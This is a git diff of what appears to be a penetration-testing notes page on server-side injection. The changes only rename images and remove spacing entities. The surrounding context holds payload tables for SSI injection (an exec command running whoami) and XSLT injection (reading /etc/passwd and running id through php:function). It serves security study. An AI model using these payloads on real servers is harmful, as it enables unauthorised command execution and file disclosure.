@@ -131,7 +131,7 @@ Content-Type: httpd/unix-directory
 
 * You can concatenate a new command to the application like the following:
 
-<figure><img src="../../.gitbook/assets/Pasted-image-20250707194908.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (950).png" alt=""><figcaption></figcaption></figure>
 
 **LINUX**
 
@@ -232,9 +232,9 @@ application/vnd.oipf.dae.svg+xml
 
 > _Check_ [_Server Side Attacks Theory 🗺️_](server-side-attacks/) _and search further to exploit the Server-side attack._ The following are contemplated:
 >
-> * SSRF&#x20;
-> * SSTI&#x20;
-> * SSI&#x20;
+> * SSRF
+> * SSTI
+> * SSI
 > * XSLT Injection
 
 ### SSRF <a href="#ssrf" id="ssrf"></a>
@@ -267,7 +267,7 @@ application/vnd.oipf.dae.svg+xml
 
 <table data-header-hidden><thead><tr><th width="214"></th><th></th></tr></thead><tbody><tr><td>Print variables</td><td><code>&#x3C;!--#printenv --></code></td></tr><tr><td>Change config</td><td><code>&#x3C;!--#config errmsg="Error!" --></code></td></tr><tr><td>Print specific variable</td><td><code>&#x3C;!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" --></code></td></tr><tr><td>Execute command</td><td><code>&#x3C;!--#exec cmd="whoami" --></code></td></tr><tr><td>Include web file</td><td><code>&#x3C;!--#include virtual="index.html" --></code></td></tr></tbody></table>
 
-<figure><img src="../../.gitbook/assets/Pasted-image-20250707203255.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (994).png" alt=""><figcaption></figcaption></figure>
 
 #### XSLT Injection <a href="#xslt-injection" id="xslt-injection"></a>
 
@@ -277,7 +277,7 @@ application/vnd.oipf.dae.svg+xml
 
 <table data-header-hidden><thead><tr><th width="214"></th><th></th></tr></thead><tbody><tr><td><strong>Information Disclosure</strong></td><td>&#x3C;--------------------------------------------------------------------</td></tr><tr><td></td><td><code>&#x3C;xsl:value-of select="system-property('xsl:version')" /></code></td></tr><tr><td></td><td><code>&#x3C;xsl:value-of select="system-property('xsl:vendor')" /></code></td></tr><tr><td></td><td><code>&#x3C;xsl:value-of select="system-property('xsl:vendor-url')" /></code></td></tr><tr><td></td><td><code>&#x3C;xsl:value-of select="system-property('xsl:product-name')" /></code></td></tr><tr><td></td><td><code>&#x3C;xsl:value-of select="system-property('xsl:product-version')" /></code></td></tr><tr><td><strong>LFI</strong></td><td>&#x3C;--------------------------------------------------------------------</td></tr><tr><td></td><td><code>&#x3C;xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" /></code></td></tr><tr><td></td><td><code>&#x3C;xsl:value-of select="php:function('file_get_contents','/etc/passwd')" /></code></td></tr><tr><td><strong>RCE</strong></td><td>&#x3C;--------------------------------------------------------------------</td></tr><tr><td></td><td><code>&#x3C;xsl:value-of select="php:function('system','id')" /></code></td></tr></tbody></table>
 
-<figure><img src="../../.gitbook/assets/Pasted-image-20250707203328.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1000).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
